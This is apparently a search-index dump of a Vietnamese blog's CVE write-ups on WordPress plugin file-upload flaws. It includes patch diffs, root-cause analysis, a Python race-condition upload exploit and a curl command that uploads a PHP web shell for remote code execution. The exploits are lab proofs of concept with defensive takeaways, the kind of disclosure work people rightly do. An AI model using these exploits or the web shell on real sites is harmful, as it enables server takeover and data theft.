--\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) ‚Äî delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o script ch·∫°y song song gi·ªØ upload v√† ƒë·ªçc import requests from concurrent.futures import ThreadPoolExecutor from datetime import datetime import threading proxies = { \"http\": \"127.0.0.1:8080\", \"https\": \"127.0.0.1:8080\" } headers = { \"User-Agent\": \"curl/8.14.1\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Cookie\": ( \"wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; \" \"wordpress_test_cookie=WP%20Cookie%20check; \" \"wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; \" \"mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D\" ) } php_payload = '\u003c?php phpinfo(); ?\u003e' upload_url = \"http://localhost/wp-admin/customize.php?kt-woomail-customize=1\" check_url = \"http://localhost/wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/\u003cfilename\u003e.php\" UPLOAD_THREADS = 40 CHECK_THREADS = 40 upload_success_detected = threading.Event() def upload_worker(_): session = requests.Session() session.headers.update(headers) session.verify = False files = { 'kt-woomail-import': (None, '5afa8d8781'), 'kadence-woomail-import-file': ('\u003cfilename\u003e.php', php_payload, 'application/octet-stream') } while not upload_success_detected.is_set(): try: response = session.post( upload_url, files=files, timeout=10 ) ts = datetime.now().strftime(\"%H:%M:%S\") if 200 \u003c= response.status_code \u003c 300: print(f\"\\033[92m[{ts}] [UPLOAD] Sent | 200 OK\\033[0m\") else: print(f\"\\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\\033[0m\") except Exception as e: print(f\"\\033[91m[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD ERROR] {e}\\033[0m\") def check_worker(_): session = requests.Session() session.proxies.update(proxies) session.verify = False while not upload_success_detected.is_set(): try: response = session.get(check_url, timeout=8) ts = datetime.now().strftime(\"%H:%M:%S\") if response.status_code == 200 and len(response.text) \u003e 0: print(f\"\\n\\033[101m[{ts}] [RCE DETECTED!] File uploaded \u0026 executed!\\033[0m\") upload_success_detected.set() break else: print(f\"[{ts}] [CHECK] {response.status_code} | Not found yet...\") except Exception as e: print(f\"[{datetime.now().strftime('%H:%M:%S')}] [CHECK ERROR] {e}\") if __name__ == \"__main__\": print(\"\\033[96m\" + \"=\"*60) print(\" WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT\") print(\" Upload + Auto Check Parallel Threads\") print(\"=\"*60 + \"\\033[0m\") print(f\"[*] Upload URL : {upload_url}\") print(f\"[*] Check URL : {check_url}\") print(f\"[*] Threads : {UPLOAD_THREADS} (upload) + {CHECK_THREADS} (check)\") print(\"[*] Press Ctrl+C to stop\\n\") try: with ThreadPoolExecutor(max_workers=UPLOAD_THREADS + CHECK_THREADS) as executor: upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)] check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)] upload_success_detected.wait() except KeyboardInterrupt: print(\"\\n\\033[93m[!] Stopped by user.\\033[0m\") finally: upload_success_detected.set() print(\"\\033[91m[!] All threads terminated.\\033[0m\") C·ª• th·ªÉ: Script n√†y s·∫Ω th·ª±c hi·ªán vi·ªác ƒë·ªìng th·ªùi upload v√† check file ƒë√£ upload, ch·ªâ khi check ƒë∆∞·ª£c (status=200) th√¨ m·ªõi d·ª´ng l·∫°i Ch·ª©c nƒÉng check s·∫Ω ƒëi qua proxy c·ªßa BurpSuite ƒë·ªÉ quan s√°t d·ªØ li·ªáu tr·∫£ v·ªÅ v√† filter d·ªÖ d√†ng qua status code. L·∫•y cookie v√† nonce th√™m v√†o script M·ªü BurpSuite ƒë·ªÉ quan s√°t request v√† response c·ªßa script ƒëi qua. Ch·∫°y script python3 -m venv venv source venv/bin/active pip install requests python script.py Tr√™n Terminal: K·∫øt qu·∫£ tr√™n terminal\rTr√™n BurpSuite: K·∫øt qu·∫£ tr√™n BurpSuite\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng x·∫£y ra do plugin b·ªè qua ki·ªÉm tra MIME (test_type =\u003e false) khi upload, cho ph√©p t·∫£i l√™n file .php. File b·ªã x√≥a ngay sau x·ª≠ l√Ω, nh∆∞ng t·ªìn t·∫°i ng·∫Øn ƒë·ªß ƒë·ªÉ khai th√°c qua race condition. ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rNguy√™n nh√¢n: thi·∫øu ki·ªÉm tra MIME + l∆∞u file t·∫°m trong th∆∞ m·ª•c public. ƒê√£ v√° ·ªü b·∫£n 1.5.15 (test_type =\u003e true). Gi·∫£i ph√°p: lu√¥n x√°c th·ª±c MIME, tr√°nh l∆∞u file th·ª±c thi v√†o th∆∞ m·ª•c public. ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Upload via Race Condition Arbitrary File Upload WordPress Kadence WooCommerce Email Designer Plugin \u003c= 1.5.14 is vulnerable to Arbitrary File Upload ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress TI WooCommerce Wishlist Plugin.","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng ‚ÄúUnrestricted Upload of File with Dangerous Type‚Äù trong TemplateInvaders TI WooCommerce Wishlist cho ph√©p t·∫£i l√™n Web Shell l√™n m√°y ch·ªß web. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn TI WooCommerce Wishlist: t·ª´ n/a ƒë·∫øn before 2.10.0. CVE ID: CVE-2025-47577 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.9.2 Patched Versions: 2.10.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress TI WooCommerce Wishlist Plugin ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - TI WooCommerce Wishlist: 2.9.2 (vulnerable) v√† 2.10.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. WooCommerce WC Fields Factory ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rfunction tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, 'test_type' =\u003e false, ] ); return $upload; } Trong phi√™n b·∫£n l·ªói, h√†m tinvwl_upload_file_wc_fields_factory() g·ªçi ƒë·∫øn wp_handle_upload() ƒë·ªÉ upload file v√†o th∆∞ m·ª•c upload ch√≠nh th·ª©c c·ªßa WordPress (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/) L·ªói\rTuy nhi√™n, t√πy ch·ªçn test_type =\u003e false khi·∫øn WordPress b·ªè qua vi·ªác ki·ªÉm tra MIME Type d·ª±a tr√™n whitelist h·ª£p l·ªá. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng upload c√°c t·ªáp nguy hi·ªÉm nh∆∞ web shell .php l√™n m√°y ch·ªß. function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, ] ); return $upload; } B·∫£n v√° lo·∫°i b·ªè t√πy ch·ªçn 'test_type' =\u003e false, n√™n m·∫∑c ƒë·ªãnh 'test_type' =\u003e true k√≠ch ho·∫°t ki·ªÉm tra MIME theo whitelist, ngƒÉn upload t·ªáp nguy hi·ªÉm nh∆∞ web shell .php. ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rC√¢u h·ªèi\rTr∆∞·ªõc khi ti·∫øn h√†nh trace, t√¥i mu·ªën t√¨m hi·ªÉu h√†m wp_handle_upload(), t√¨m ƒë√°p √°n cho 2 c√¢u h·ªèi: V√¨ sao lo·∫°i b·ªè 'test_type' =\u003e false l·∫°i k√≠ch ho·∫°t ki·ªÉm tra MIME theo whitelist? Whilelist ƒë√≥ bao g·ªìm nh·ªØng g√¨? wp_handle_upload() l√† wrapper c·ªßa h√†m _wp_handle_upload() function wp_handle_upload( \u0026$file, $overrides = false, $time = null ) { /* * $_POST['action'] must be set and its value must equal $overrides['action'] * or this: */ $action = 'wp_handle_upload'; if ( isset( $overrides['action'] ) ) { $action = $overrides['action']; } return _wp_handle_upload( $file, $overrides, $time, $action ); } wp_handle_upload() thi·∫øt l·∫≠p $action v√† g·ªçi ƒë·∫øn _wp_handle_upload() Trong file ch·ª©a _wp_handle_upload(), d√≤ng 915 $test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true; üëâ G√°n gi√° tr·ªã cho bi·∫øn $test_type - n·∫øu trong $overrides c√≥ key 'test_type' th√¨ d√πng gi√° tr·ªã ƒë√≥, ng∆∞·ª£c l·∫°i th√¨ m·∫∑c ƒë·ªãnh l√† true. T·ª©c khi ta kh√¥ng truy·ªÅn test_type ho·∫∑c truy·ªÅn test_type =\u003e true th√¨ $test_type l√† true T·∫°i d√≤ng 953-973 if ( $test_type ) { $wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect. if ( $proper_filename ) { $file['name'] = $proper_filename; } if ( ( ! $type || ! $ext ) \u0026\u0026 ! current_user_can( 'unfiltered_upload' ) ) { return call_user_func_array( $upload_error_handler, array( \u0026$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) ); } if ( ! $type ) { $type = $file['type']; } } else { $type = ''; } N·∫øu $test_type = true, h√†m s·∫Ω g·ªçi wp_check_filetype_and_ext() ƒë·ªÉ ki·ªÉm tra ƒëu√¥i file v√† MIME type d·ª±a tr√™n danh s√°ch h·ª£p l·ªá (whitelist) c·ªßa WordPress. N·∫øu file kh√¥ng c√≥ ƒëu√¥i ho·∫∑c MIME type h·ª£p l·ªá, v√† ng∆∞·ªùi d√πng kh√¥ng c√≥ quy·ªÅn ƒë·∫∑c bi·ªát (unfiltered_upload), h·ªá th·ªëng s·∫Ω t·ª´ ch·ªëi upload. Lines 3089-3315 function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) { $proper_filename = false; // Do basic extension validation and MIME mapping. $wp_filetype = wp_check_filetype( $filename, $mimes ); ... // Validate image types. // Validate files that didn't get validated during previous checks. // The mime type must be allowed. ... } wp_check_filetype_and_ext() g·ªçi ƒë·∫øn wp_check_filetype() ƒë·ªÉ th·ª±c hi·ªán x√°c th·ª±c ph·∫ßn m·ªü r·ªông c∆° b·∫£n v√† √°nh x·∫° MIME. Line 3045-3062 function wp_check_filetype( $filename, $mimes = null ) { if ( empty( $mimes ) ) { $mimes = get_allowed_mime_types(); } $type = false; $ext = false; foreach ( $mimes as $ext_preg =\u003e $mime_match ) { $ext_preg = '!\\.(' . $ext_preg . ')$!i'; if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { $type = $mime_match; $ext = $ext_matches[1]; break; } } return compact( 'ext', 'type' ); } wp_check_filetype() ch·ªâ ki·ªÉm tra ƒëu√¥i file (extension) d·ª±a tr√™n whitelist MIME c·ªßa WordPress - kh√¥ng x√°c minh n·ªôi dung th·∫≠t c·ªßa file H√†m g·ªçi ƒë·∫øn get_allowed_mime_types() ƒë·ªÉ l·∫•y danh s√°ch MIME Types Line 3640-3661 function get_allowed_mime_types( $user = null ) { $t = wp_get_mime_types(); unset( $t['swf'], $t['exe'] ); if ( function_exists( 'current_user_can' ) ) { $unfiltered = $user ? user_can( $user, 'unfiltered_html' ) : current_user_can( 'unfiltered_html' ); } if ( empty( $unfiltered ) ) { unset( $t['htm|html'], $t['js'] ); } /** * Filters the list of allowed mime types and file extensions. * * @since 2.0.0 * * @param array $t Mime types keyed by the file extension regex corresponding to those types. * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user). */ return apply_filters( 'upload_mimes', $t, $user ); } wp_get_mime_types() ƒë∆∞·ª£c g·ªçi s·∫Ω tr·∫£ v·ªÅ danh s√°ch MIME Types th·∫≠t s·ª± ƒë∆∞·ª£c ch·∫•p nh·∫≠n Line 3430-3557 function wp_get_mime_types() { /** * Filters the list of mime t","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded ‚Üí add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() ‚Äî MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads ‚Üí possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded ‚Üí add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() ‚Äî MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads ‚Üí possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded ‚Üí add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() ‚Äî MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads ‚Üí possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded ‚Üí add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() ‚Äî MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads ‚Üí possible RCE\"]\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o file .php ch·ª©a web shell \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e G·ª≠i POST request curl -X POST \"http://localhost\" -F \"tinv_wishlist_id=1\" -F \"product_id=1\" -F \"form[image]=1\" -F \"image=@rce.php\" RCE v·ªõi file upload RCE v·ªõi file upload\r","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-47577 b·∫Øt ngu·ªìn t·ª´ vi·ªác v√¥ hi·ªáu h√≥a ki·ªÉm tra MIME type (test_type =\u003e false) trong h√†m wp_handle_upload(), cho ph√©p k·∫ª t·∫•n c√¥ng t·∫£i l√™n b·∫•t k·ª≥ t·ªáp n√†o, bao g·ªìm m√£ PHP ƒë·ªôc h·∫°i. Khi file ƒë∆∞·ª£c t·∫£i l√™n th∆∞ m·ª•c /wp-content/uploads/, n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p tr·ª±c ti·∫øp ƒë·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE). B·∫£n v√° 2.10.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·∫≠t l·∫°i ki·ªÉm tra MIME, ƒë·∫£m b·∫£o ch·ªâ nh·ªØng lo·∫°i file h·ª£p l·ªá trong danh s√°ch whitelist c·ªßa WordPress m·ªõi ƒë∆∞·ª£c ph√©p upload. ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rLu√¥n duy tr√¨ ki·ªÉm tra MIME type v√† ph·∫ßn m·ªü r·ªông file khi x·ª≠ l√Ω upload. Kh√¥ng n√™n ghi ƒë√® c√°c c∆° ch·∫ø b·∫£o m·∫≠t m·∫∑c ƒë·ªãnh c·ªßa WordPress nh∆∞ test_type. Khi ph√¢n t√≠ch l·ªó h·ªïng, vi·ªác so s√°nh patch diff gi√∫p nhanh ch√≥ng nh·∫≠n di·ªán nguy√™n nh√¢n g·ªëc (root cause). Nh√† ph√°t tri·ªÉn plugin c·∫ßn th∆∞·ªùng xuy√™n ki·ªÉm tra c√°c hook v√† filter li√™n quan ƒë·∫øn upload ƒë·ªÉ tr√°nh r·ªßi ro RCE. ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress TI WooCommerce Wishlist Plugin \u003c= 2.9.2 is vulnerable to Arbitrary File Upload ","date":"2025-11-07","objectID":"/vi/posts/2025-11-07-cve-2025-47577/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/vi/posts/2025-11-07-cve-2025-47577/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed PDF for WPForms Plugin.","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Embed PDF for WPForms cho WordPress b·ªã l·ªó h·ªïng cho ph√©p arbitrary file uploads do thi·∫øu ki·ªÉm tra lo·∫°i file trong h√†m ajax_handler_download_pdf_media ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 1.1.5. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn truy c·∫≠p t·ª´ m·ª©c Subscriber tr·ªü l√™n, t·∫£i l√™n c√°c file t√πy √Ω l√™n server c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, v√† c√≥ th·ªÉ d·∫´n ƒë·∫øn remote code execution. CVE ID: CVE-2025-10647 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.1.5 Patched Versions: 1.1.6 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress Embed PDF for WPForms Plugin ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed PDF for WPForms: 1.1.5 (vulnerable) v√† 1.1.6 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. WPForms Plugin ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rpublic function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } Trong phi√™n b·∫£n l·ªói, h√†m ajax_handler_download_pdf_media() t·∫£i m·ªôt file PDF t·ª´ URL ƒë∆∞·ª£c cung c·∫•p v√†o Media Library c·ªßa WordPress th√¥ng qua AJAX nh∆∞ng kh√¥ng ki·ªÉm tra lo·∫°i file, kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng. L·ªói\rAttacker c√≥ th·ªÉ upload file .php ƒë·ªÉ th·ª±c hi·ªán RCE public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } B·∫£n v√° ƒë√£: Th·ª±c hi·ªán ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng: if ( ! current_user_can( 'upload_files' ) ) { ... } Ch·ªâ cho ph√©p user c√≥ quy·ªÅn upload m·ªõi ƒë∆∞·ª£c g·ªçi handler. Ch·ªâ ch·∫•p nh·∫≠n m·ªôt s·ªë lo·∫°i file ƒë∆∞·ª£c t·∫£i l√™n if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } wp_check_filetype() thu·ªôc WP Core tr·∫£ v·ªÅ 2 key ch√≠nh: array( 'ext' =\u003e string|false, 'type' =\u003e string|false ) N·∫øu type kh√¥ng thu·ªôc wp_get_mime_types() th√¨ tr·∫£ v·ªÅ false. M·∫∑c ƒë·ªãnh ch·ªâ ch·∫•p nh·∫≠n c√°c file kh√¥ng 